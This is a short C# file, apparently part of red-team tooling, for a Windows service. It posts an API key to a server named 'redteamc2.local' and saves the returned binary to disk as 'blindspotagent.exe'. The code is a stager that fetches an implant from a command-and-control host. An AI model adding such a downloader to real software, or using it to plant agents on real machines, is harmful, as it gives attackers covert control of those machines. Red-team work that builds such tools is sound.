using Newtonsoft.Json;
using System.IO;

namespace App.WindowsService;


public class Download
{
    public async Task<bool> DownloadAgent(Config config)
    {
        using (var client = new HttpClient())
        {
            var postData = new Dictionary<string, string>
            {
                { "API_KEY", $"{config.api_key}" }
            };
            var content = new FormUrlEncodedContent(postData);
            var uri = new Uri($"http://redteamc2.local:8888/endpoints/agent/fetch/{config.agent_install_uuid}");
            
            var response = client.PostAsync(uri, content);
            var fileName = response.Result.Headers.ToString();

            using (var stream = await response.Result.Content.ReadAsStreamAsync())
            {
                var fileInfo = new FileInfo($"{config.path}\\blindspotagent.exe");
                using (var fileStream = fileInfo.OpenWrite())
                {
                    await stream.CopyToAsync(fileStream);
                }
            }
            return true;
        }
    }
}